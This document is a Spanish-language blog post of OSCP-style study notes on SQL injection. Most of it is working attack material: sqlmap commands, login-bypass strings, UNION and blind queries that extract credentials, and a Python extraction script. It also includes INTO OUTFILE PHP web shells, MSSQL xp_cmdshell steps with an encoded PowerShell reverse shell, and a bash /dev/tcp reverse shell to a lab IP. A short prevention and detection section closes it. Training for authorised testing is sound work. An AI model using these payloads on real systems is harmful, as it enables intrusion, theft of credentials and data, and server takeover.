---
redirect_from:
  - /posts/BASES-DATOS-SQL-INJECTION-Apuntes/

title: SQL Injection y Bases de Datos - Guía Completa
date: 'Fri, 05 Dec 2025 00:00:00 GMT'
categories:
  - Apuntes
  - SQL Injection
tags:
  - sqli
  - sql-injection
  - mysql
  - mssql
  - mongodb
  - union-based
  - blind-sqli
  - sqlmap
  - oscp
  - owasp
  - apuntes
  - pentesting
image: >-
  /assets/img/cabeceras/2025-12-05-SQL-INJECTION-Y-BASES-DE-DATOS-GUIA-COMPLETA.png
---

# SQL Injection y Bases de Datos - Guía Completa

## 🎯 Introducción a SQL Injection

### ¿Qué es SQL Injection?

**SQL Injection (SQLi)** es una vulnerabilidad de seguridad que permite a un atacante interferir con las consultas SQL que una aplicación hace a su base de datos. Es una de las vulnerabilidades web más peligrosas según OWASP Top 10.

**Impacto**:
- ✅ Bypass de autenticación
- ✅ Acceso a datos sensibles
- ✅ Modificación/eliminación de datos
- ✅ Ejecución de comandos en el servidor (en algunos casos)
- ✅ Lectura de archivos del sistema
- ✅ Escritura de web shells

**🎯 MITRE ATT&CK**: T1190 - Exploit Public-Facing Application

### Tipos de SQL Injection

| Tipo | Descripción | Detección |
|------|-------------|-----------|
| **In-Band** | Respuesta visible en la misma aplicación | Fácil |
| **Blind** | Sin respuesta visible, inferencia por comportamiento | Difícil |
| **Out-of-Band** | Datos extraídos por canal diferente (DNS, HTTP) | Muy difícil |

#### Subcategorías

**In-Band**:
- Union-Based: Usa UNION para combinar resultados
- Error-Based: Extrae datos a través de mensajes de error

**Blind**:
- Boolean-Based: Inferencia por respuestas True/False
- Time-Based: Inferencia por delays en respuesta

---

## 🤖 SQLMap - Automatización

### ¿Qué es SQLMap?

**SQLMap** es la herramienta más potente para detectar y explotar SQL Injection automáticamente.

### Uso Básico

```bash
# SQLi en formulario con método POST
sqlmap -u "http://172.17.0.2/login.html" --forms --batch --dbs --dump

# SQLi desde archivo de petición (Burp Suite)
sqlmap -r req.txt -p username --dbs

# Especificar parámetro vulnerable
sqlmap -u "http://example.com/page?id=1" -p id --dbs

# Con cookie de sesión
sqlmap -u "http://example.com/page?id=1" --cookie="PHPSESSID=abc123" --dbs

# Bypass WAF
sqlmap -u "http://example.com/page?id=1" --tamper=space2comment --dbs
```

### Opciones Importantes

```bash
# Listar bases de datos
--dbs

# Seleccionar base de datos
-D database_name

# Listar tablas
--tables

# Seleccionar tabla
-T table_name

# Listar columnas
--columns

# Extraer datos
--dump

# Todo en uno
--dump-all

# Obtener shell interactiva
--os-shell

# Leer archivo
--file-read="/etc/passwd"

# Escribir archivo
--file-write="shell.php" --file-dest="/var/www/html/shell.php"

# Técnicas específicas
--technique=U  # Union-based
--technique=E  # Error-based
--technique=B  # Boolean-based blind
--technique=T  # Time-based blind
--technique=S  # Stacked queries

# Nivel de riesgo y agresividad
--level=5    # Nivel de tests (1-5)
--risk=3     # Riesgo de impacto (1-3)

# Threads (velocidad)
--threads=10
```

### Bypasses y Tampers

```bash
# Space to comment
--tamper=space2comment

# Random case
--tamper=randomcase

# Entre otros
--tamper=between

# Múltiples tampers
--tamper=space2comment,between,randomcase
```

**Lista completa de tampers**: `/usr/share/sqlmap/tamper/`

**🔥 Tip OSCP**: SQLMap está permitido en el examen, pero úsalo con `--batch` para no interactuar.

---

## 🔓 Authentication Bypass

### Concepto

Subvertir la lógica de una consulta SQL de login para autenticarse sin credenciales válidas.

### Consulta Vulnerable Típica

```sql
SELECT * FROM users WHERE username='$user' AND password='$pass'
```

### Payloads de Bypass

#### Comentarios SQL

```sql
# MySQL/MariaDB
--
#

# MSSQL
--
/**/

# Oracle
--
```

#### Payloads Comunes

```python
# Bypass básico
' or '1'='1
' or '1'='1'--
' or '1'='1' --
' or '1'='1'#
' or '1'='1'/*

# Bypass con OR
' or 1=1--
' or 1=1#
' or 1=1/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#

# Bypass con usuario específico
admin'--
admin'#
admin'/*
administrator'--

# Bypass con paréntesis
') or ('1'='1
') or ('1'='1'--
') or ('1'='1'#
```

#### Ejemplo en Formulario Web

```http
POST /login.php HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded

username=admin'+or+'1'%3D'1'--+&password=cualquiercosa
```

**URL Encoded**:
- `'` = `%27`
- `+` = `%2B` (espacio)
- `=` = `%3D`
- `#` = `%23`
- `--` = `--%2B` (con espacio)

### Inyección en Diferentes Lugares

```sql
# En SELECT de otros resultados
' OR 1=1 IN (SELECT @@version) -- //
' OR 1=1 IN (SELECT * FROM users) -- //
' OR 1=1 IN (SELECT password FROM users) -- //
' OR 1=1 IN (SELECT password FROM users WHERE username = 'admin') -- //
```

**🎯 MITRE ATT&CK**: T1078 - Valid Accounts

---

## 🔗 Union-Based SQL Injection

### ¿Qué es Union-Based SQLi?

Utiliza el operador SQL `UNION` para combinar los resultados de la consulta original con una consulta inyectada, permitiendo extraer datos de otras tablas.

### Requisitos

1. Misma cantidad de columnas en ambas consultas
2. Tipos de datos compatibles
3. La aplicación muestra los resultados

### Metodología Paso a Paso

#### Paso 1: Determinar Número de Columnas

**Método 1: ORDER BY**

```sql
' ORDER BY 1-- //
' ORDER BY 2-- //
' ORDER BY 3-- //
' ORDER BY 4-- //
' ORDER BY 5-- //

# Cuando falle, sabemos el número de columnas
# Ejemplo: Si falla en ORDER BY 5, hay 4 columnas
```

**Método 2: UNION SELECT**

```sql
' UNION SELECT NULL-- //
' UNION SELECT NULL,NULL-- //
' UNION SELECT NULL,NULL,NULL-- //
' UNION SELECT NULL,NULL,NULL,NULL-- //

# Continuar hasta que la query sea válida
```

**💡 ¿Por qué NULL?** NULL es compatible con cualquier tipo de dato.

#### Paso 2: Identificar Columnas que se Muestran

```sql
# Si hay 4 columnas
' UNION SELECT 1,2,3,4-- //

# Observar qué números aparecen en la página
# Ejemplo: Si vemos "2" y "3", esas columnas son visibles
```

#### Paso 3: Extraer Información de la Base de Datos

**Versión de la base de datos**:
```sql
' UNION SELECT NULL,@@version,NULL,NULL-- //
```

**Base de datos actual**:
```sql
' UNION SELECT NULL,database(),NULL,NULL-- //
```

**Usuario actual**:
```sql
' UNION SELECT NULL,user(),NULL,NULL-- //
```

#### Paso 4: Enumerar Esquemas (Databases)

```sql
# Listar todas las bases de datos
' UNION SELECT NULL,schema_name,NULL,NULL FROM information_schema.schemata-- //

# O GROUP_CONCAT para ver todas en una línea
' UNION SELECT NULL,GROUP_CONCAT(schema_name),NULL,NULL FROM information_schema.schemata-- //
```

#### Paso 5: Enumerar Tablas

```sql
# Listar tablas de una base de datos específica
' UNION SELECT NULL,table_name,table_schema,NULL FROM information_schema.tables WHERE table_schema='dev'-- //

# Con GROUP_CONCAT
' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema='dev'-- //
```

#### Paso 6: Enumerar Columnas

```sql
# Listar columnas de una tabla específica
' UNION SELECT NULL,column_name,table_name,table_schema FROM information_schema.columns WHERE table_name='credentials'-- //

# Con GROUP_CONCAT
' UNION SELECT NULL,GROUP_CONCAT(column_name),NULL,NULL FROM information_schema.columns WHERE table_name='credentials'-- //
```

#### Paso 7: Extraer Datos

```sql
# Extraer datos de columnas específicas
' UNION SELECT NULL,username,password,NULL FROM dev.credentials-- //

# Concatenar múltiples columnas
' UNION SELECT NULL,CONCAT(username,':',password),NULL,NULL FROM dev.credentials-- //

# Con GROUP_CONCAT para ver todos los registros
' UNION SELECT NULL,GROUP_CONCAT(username,':',password SEPARATOR '<br>'),NULL,NULL FROM dev.credentials-- //
```

### Resumen de Payloads

```sql
# Detectar número de columnas
' ORDER BY 1-- //
' ORDER BY 5-- //

# Inyectar datos
' UNION SELECT database(), user(), @@version, null, null -- //
' UNION SELECT null, null, database(), user(), @@version  -- //

# Enumerar
' UNION SELECT null, table_name, column_name, table_schema, null FROM information_schema.columns WHERE table_schema=database() -- //

# Extraer datos
' UNION SELECT null, username, password, description, null FROM users -- //
```

### Lectura de Archivos

```sql
# Verificar privilegios
' UNION SELECT NULL,super_priv,NULL,NULL FROM mysql.user-- //
' UNION SELECT NULL,super_priv,NULL,NULL FROM mysql.user WHERE user="root"-- //
' UNION SELECT NULL,grantee,privilege_type,is_grantable FROM information_schema.user_privileges-- //

# Verificar secure_file_priv
' UNION SELECT NULL,variable_name,variable_value,NULL FROM information_schema.global_variables WHERE variable_name="secure_file_priv"-- //

# Leer archivo
' UNION SELECT NULL,LOAD_FILE("/etc/passwd"),NULL,NULL-- //
' UNION SELECT NULL,LOAD_FILE("/var/www/html/config.php"),NULL,NULL-- //
```

### Escritura de Archivos y RCE

```sql
# Escribir archivo simple
' UNION SELECT NULL,'file written successfully!',NULL,NULL INTO OUTFILE '/var/www/html/proof.txt'-- //

# Web Shell básica
' UNION SELECT NULL,'<?php system($_REQUEST[0]); ?>',NULL,NULL INTO OUTFILE '/var/www/html/shell.php'-- //

# O con GET
' UNION SELECT NULL,'<?php system($_GET["cmd"]); ?>',NULL,NULL INTO OUTFILE '/var/www/html/cmd.php'-- //

# Invocar web shell
# http://target.com/shell.php?0=id
# http://target.com/cmd.php?cmd=whoami
```

**⚠️ Requisitos**:
- Permisos FILE
- Conocer webroot path
- Permisos de escritura en webroot
- secure_file_priv no restrictivo

**🎯 MITRE ATT&CK**: T1505.003 - Server Software Component: Web Shell

---

## ❌ Error-Based SQL Injection

### ¿Qué es Error-Based SQLi?

Extrae datos a través de mensajes de error de la base de datos que se muestran en la aplicación.

### Identificación

#### Payloads de Detección

```sql
'      # Single quote
"      # Double quote
#      # Hash
;      # Semicolon
)      # Closing parenthesis
```

**URL Encoded**:
```
%27    # Single quote
%22    # Double quote
%23    # Hash
%3B    # Semicolon
%29    # Closing parenthesis
```

### Ejemplo de Error

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1''' at line 1
```

**Interpretación**: La aplicación es vulnerable y usa MySQL.

### Técnicas de Extracción

#### ExtractValue() - MySQL

```sql
# Extraer versión
' AND extractvalue(0x0a,concat(0x0a,(SELECT @@version)))-- //

# Extraer base de datos actual
' AND extractvalue(0x0a,concat(0x0a,(SELECT database())))-- //

# Extraer datos
' AND extractvalue(0x0a,concat(0x0a,(SELECT GROUP_CONCAT(username,':',password) FROM users)))-- //
```

#### UpdateXML() - MySQL

```sql
# Extraer versión
' AND updatexml(null,concat(0x0a,version()),null)-- //

# Extraer datos
' AND updatexml(null,concat(0x0a,(SELECT GROUP_CONCAT(username) FROM users)),null)-- //
```

#### CAST() - PostgreSQL/MySQL

```sql
' AND 1=CAST((SELECT version()) AS int)-- //
' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)-- //
```

**💡 Limitación**: Los mensajes de error suelen truncar después de cierto número de caracteres (generalmente 64).

---

## 🔍 Boolean-Based Blind SQLi

### ¿Qué es Boolean-Based Blind SQLi?

No hay mensajes de error ni datos visibles, pero la aplicación responde de manera diferente (True/False) según si la consulta es verdadera o falsa.

### Indicadores de Boolean-Based

- Página muestra contenido diferente
- Código de estado HTTP diferente (200 vs 404)
- Tiempo de respuesta similar pero contenido distinto

### Metodología

#### Paso 1: Determinar Número de Columnas

```sql
# Ir incrementando hasta que la respuesta sea False
admin123' UNION SELECT 1;--
admin123' UNION SELECT 1,2,3;--
admin123' UNION SELECT 1,2,3,4;--

# Si True con 3 columnas y False con 4, hay 3 columnas
```

#### Paso 2: Extraer Nombre de Base de Datos

```sql
# Probar carácter por carácter
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 's%';--
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'sq%';--
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'sql%';--
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'sqli%';--
# ...continuar hasta completar el nombre

# O con substring
admin123' UNION SELECT 1,2,3 WHERE SUBSTRING(database(),1,1)='s';--
admin123' UNION SELECT 1,2,3 WHERE SUBSTRING(database(),2,1)='q';--
# ...continuar
```

#### Paso 3: Extraer Nombre de Tabla

```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema='sqli_three' AND table_name LIKE 'a%';--
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema='sqli_three' AND table_name LIKE 'u%';--
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema='sqli_three' AND table_name LIKE 'us%';--
# ...continuar hasta 'users'
```

#### Paso 4: Extraer Nombre de Columnas

```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.columns WHERE table_schema='sqli_three' AND table_name='users' AND column_name LIKE 'a%' AND column_name !='id';--
# Probar con diferentes letras hasta encontrar 'username' y 'password'
```

#### Paso 5: Extraer Datos

```sql
# Extraer username
admin123' UNION SELECT 1,2,3 FROM users WHERE username LIKE 'a%';--
admin123' UNION SELECT 1,2,3 FROM users WHERE username LIKE 'ad%';--
admin123' UNION SELECT 1,2,3 FROM users WHERE username LIKE 'adm%';--
# ...hasta 'admin'

# Extraer password del usuario admin
admin123' UNION SELECT 1,2,3 FROM users WHERE username='admin' AND password LIKE 'a%';--
# ...continuar
```

### Script de Automatización (Python)

```python
import requests
import string

url = "http://target.com/login.php"
characters = string.printable
database_name = ""

for position in range(1, 20):  # Asumir max 20 caracteres
    for char in characters:
        payload = f"admin123' UNION SELECT 1,2,3 WHERE SUBSTRING(database(),{position},1)='{char}';--"
        data = {"username": payload, "password": "anything"}

        response = requests.post(url, data=data)

        if "Welcome" in response.text:  # Indicador de True
            database_name += char
            print(f"[+] Found: {database_name}")
            break
    else:
        break  # No más caracteres

print(f"[+] Database name: {database_name}")
```

---

## ⏱️ Time-Based Blind SQLi

### ¿Qué es Time-Based Blind SQLi?

Similar a Boolean-based, pero la única diferencia observable es el tiempo de respuesta. Se usa `SLEEP()` o funciones similares.

### Funciones de Delay por DBMS

| DBMS | Función |
|------|---------|
| MySQL/MariaDB | `SLEEP(seconds)` |
| PostgreSQL | `pg_sleep(seconds)` |
| MSSQL | `WAITFOR DELAY '00:00:05'` |
| Oracle | `DBMS_LOCK.SLEEP(seconds)` |
| SQLite | No tiene función nativa |

### Metodología

#### Paso 1: Determinar Número de Columnas

```sql
admin123' UNION SELECT SLEEP(5);--

# No hay delay? Agregar columna
admin123' UNION SELECT SLEEP(5),2;--

# Aún no? Agregar otra
admin123' UNION SELECT SLEEP(5),2,3;--

# Si hay delay de 5 segundos, hay 3 columnas
```

#### Paso 2: Extraer Nombre de Base de Datos

```sql
admin123' UNION SELECT SLEEP(5),2,3 WHERE database() LIKE 'u%';--
# Probar diferentes letras
admin123' UNION SELECT SLEEP(5),2,3 WHERE database() LIKE 's%';--
# ...hasta completar 'sqli_four'
```

#### Paso 3: Extraer Nombre de Tabla

```sql
admin123' UNION SELECT SLEEP(5),2,3 FROM information_schema.tables WHERE table_schema='sqli_four' AND table_name LIKE 'a%';--
# ...hasta 'users'
```

#### Paso 4: Extraer Columnas

```sql
admin123' UNION SELECT SLEEP(5),2,3 FROM information_schema.columns WHERE table_schema='sqli_four' AND table_name='users' AND column_name LIKE 'a%';--
# ...hasta 'username' y 'password'
```

#### Paso 5: Extraer Datos

```sql
# Username
admin123' UNION SELECT SLEEP(5),2,3 FROM users WHERE username LIKE 'a%';--
# ...hasta 'admin'

# Password
admin123' UNION SELECT SLEEP(5),2,3 FROM users WHERE username='admin' AND password LIKE 'a%';--
# ...hasta 'pass'
```

### Optimización con Binary Search

En lugar de probar todos los caracteres, usar búsqueda binaria con ASCII:

```sql
# Verificar si el primer carácter es > 'M' (ASCII 77)
' AND IF(ASCII(SUBSTRING(database(),1,1))>77,SLEEP(5),0)-- //

# Si hay delay, es > 77, probar > 100
# Si no hay delay, es <= 77, probar > 50
# Continuar hasta encontrar el valor exacto
```

**💡 Ventaja**: Reduce drásticamente el número de peticiones.

---

## 🐬 MySQL Exploitation

### Comandos MySQL Cheat Table

| Categoría | Comando | Descripción |
|-----------|---------|-------------|
| **General** | `mysql -u root -h docker.hackthebox.eu -P 3306 -p` | Login a MySQL |
| | `SHOW DATABASES` | Listar bases de datos |
| | `USE users` | Seleccionar base de datos |
| **Tablas** | `CREATE TABLE logins (id INT, ...)` | Crear tabla |
| | `SHOW TABLES` | Listar tablas |
| | `DESCRIBE logins` | Ver estructura de tabla |
| | `INSERT INTO table_name VALUES (value_1,..)` | Insertar datos |
| | `UPDATE table_name SET column1=newvalue1 WHERE <condition>` | Actualizar datos |
| | `DROP TABLE logins` | Eliminar tabla |
| **Columnas** | `SELECT * FROM table_name` | Seleccionar todas las columnas |
| | `SELECT column1, column2 FROM table_name` | Columnas específicas |
| | `ALTER TABLE logins ADD newColumn INT` | Agregar columna |
| | `ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn` | Renombrar columna |
| | `ALTER TABLE logins MODIFY oldColumn DATE` | Cambiar tipo de dato |
| | `ALTER TABLE logins DROP oldColumn` | Eliminar columna |
| **Output** | `SELECT * FROM logins ORDER BY column_1` | Ordenar por columna |
| | `SELECT * FROM logins ORDER BY column_1 DESC` | Orden descendente |
| | `SELECT * FROM logins LIMIT 2` | Limitar resultados |
| | `SELECT * FROM logins WHERE <condition>` | Filtrar con condición |
| | `SELECT * FROM logins WHERE username LIKE 'admin%'` | Búsqueda con patrón |

### MySQL Operator Precedence

Orden de evaluación de operadores (mayor a menor precedencia):

1. División (`/`), Multiplicación (`*`), Módulo (`%`)
2. Adición (`+`), Sustracción (`-`)
3. Comparación (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
4. NOT (`!`)
5. AND (`&&`)
6. OR (`||`)

**💡 Importante**: El operador AND se evalúa ANTES que OR. Usar paréntesis para claridad.

### SQL Injection Payloads Table

| Tipo | Payload | Descripción |
|------|---------|-------------|
| **Auth Bypass** | `admin' or '1'='1` | Bypass básico |
| | `admin')-- -` | Bypass con comentarios |
| **Union Injection** | `' order by 1-- -` | Detectar número de columnas |
| | `cn' UNION select 1,2,3-- -` | Union básica |
| | `cn' UNION select 1,@@version,3,4-- -` | Obtener versión |
| | `UNION select username, 2, 3, 4 from passwords-- -` | Extraer datos |
| **DB Enumeration** | `SELECT @@version` | Versión de MySQL |
| | `SELECT SLEEP(5)` | Fingerprint time-based |
| | `cn' UNION select 1,database(),2,3-- -` | Nombre de DB actual |
| | `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -` | Listar databases |
| | `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -` | Listar tablas |
| | `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -` | Listar columnas |
| | `cn' UNION select 1, username, password, 4 from dev.credentials-- -` | Extraer datos |
| **Privileges** | `cn' UNION SELECT 1, user(), 3, 4-- -` | Usuario actual |
| | `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -` | Check admin privileges |
| | `cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -` | Todos los privilegios |
| | `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` | Directorios accesibles |
| **File Injection** | `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -` | Leer archivo |
| | `select 'file written successfully!' into outfile '/var/www/html/proof.txt'` | Escribir archivo |
| | `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -` | Web shell |

### Boolean-Based desde URL

```http
# True condition
http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //

# False condition
http://192.168.50.16/blindsqli.php?user=offsec' AND 1=2 -- //

# Time-based
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
```

---

## 🗄️ MSSQL Server Exploitation

### Resumen de Técnicas

```sql
# Habilitar xp_cmdshell
EXEC sp_configure 'Show Advanced Options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

# Ejecutar comandos
EXEC xp_cmdshell 'whoami';

# Obtener hash con Responder
EXEC xp_dirtree '\\10.10.14.50\share';

# Reverse shell
EXEC xp_cmdshell 'powershell -enc <base64_payload>';
```

---

## 🍃 MongoDB

### Conexión

```bash
# Conectar a MongoDB
mongo -u <user> -p <password> <database>

# Sin autenticación
mongo <host>:<port>/<database>
```

### Inyección NoSQL

```javascript
// Bypass de autenticación
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}

// OR condition
{"$or": [{"username": "admin"}, {"username": "administrator"}]}

// Injection en campo
{"username": {"$gt": ""}, "password": {"$gt": ""}}
```

### Reverse Shell desde MongoDB

```javascript
// Insertar tarea que ejecuta comando
db.tasks.insert({"cmd": "bash -c 'bash -i >& /dev/tcp/10.10.14.115/4444 0>&1'"})
```

**Recursos**: [NoSQL Injection - HackTricks](https://book.hacktricks.xyz/pentesting-web/nosql-injection)

---

## 🎓 Tips para OSCP

### Checklist de SQL Injection

- [ ] Probar payloads básicos (`'`, `"`, `)`)
- [ ] Identificar tipo de base de datos (error messages)
- [ ] Determinar número de columnas (ORDER BY / UNION)
- [ ] Encontrar columnas visibles
- [ ] Extraer version, database, user
- [ ] Enumerar tablas y columnas
- [ ] Extraer credenciales
- [ ] Intentar leer archivos (LOAD_FILE)
- [ ] Intentar escribir web shell (INTO OUTFILE)
- [ ] Si es MSSQL, intentar xp_cmdshell

### Comandos Rápidos

```bash
# SQLMap rápido
sqlmap -u "http://target.com/page?id=1" --batch --dbs

# Union-based manual
' UNION SELECT NULL,@@version,database(),user()-- //

# Boolean-based detectar columnas
' ORDER BY 1-- //
' ORDER BY 5-- //
```

### Errores Comunes

1. **Olvidar comentar el resto de la query** (`-- //`, `#`, `/*`)
2. **No URL-encodear payloads** en GET requests
3. **No verificar número exacto de columnas**
4. **No verificar tipos de datos compatibles**
5. **Usar SLEEP() con valores muy altos** (usar 3-5 segundos)

---

## 🛡️ Contramedidas y Detección

### Prevención

**Prepared Statements (Parameterized Queries)**:
```php
// PHP con PDO (CORRECTO)
$stmt = $pdo->prepare('SELECT * FROM users WHERE username = ? AND password = ?');
$stmt->execute([$username, $password]);

// PHP vulnerable (INCORRECTO)
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```

**Otros métodos**:
- Validación de entrada (whitelist, no blacklist)
- Escapar caracteres especiales
- Principio de menor privilegio en la base de datos
- WAF (Web Application Firewall)
- Deshabilitar mensajes de error en producción

### Detección

**Indicadores de ataque**:
- Múltiples `'` o `"` en parámetros
- Palabras clave SQL (`UNION`, `SELECT`, `SLEEP`)
- Patrones de encoding (`%27`, `%22`)
- Delays inusuales en respuestas
- Múltiples errores de SQL en logs

**Herramientas de detección**:
- ModSecurity (WAF open-source)
- OWASP ZAP
- Burp Suite Scanner

---

## 📚 Recursos y Referencias

### Práctica

- [PortSwigger SQL Injection Labs](https://portswigger.net/web-security/sql-injection)
- [TryHackMe SQL Injection](https://tryhackme.com/room/sqlinjectionlm)
- [HackTheBox Academy - SQL Injection](https://academy.hackthebox.com/module/33/section/177)

### Payloads

- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [SQL Injection Payload List](https://github.com/cyberteach360/sql-injection/blob/main/payload/payload.txt)

### Documentación

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQLMap Documentation](https://github.com/sqlmapproject/sqlmap/wiki)
- [MySQL Documentation](https://dev.mysql.com/doc/)

### Herramientas

- [SQLMap](https://sqlmap.org/)
- [jSQL Injection](https://github.com/ron190/jsql-injection)
- [NoSQLMap](https://github.com/codingo/NoSQLMap)

---

**Última actualización**: 2025-01-10<br>
**Autor**: A. Lorente<br>
**Licencia**: Creative Commons BY-NC-SA 4.0

**Créditos**: Basado en contenido de [cyberteach360](https://github.com/cyberteach360/sql-injection)
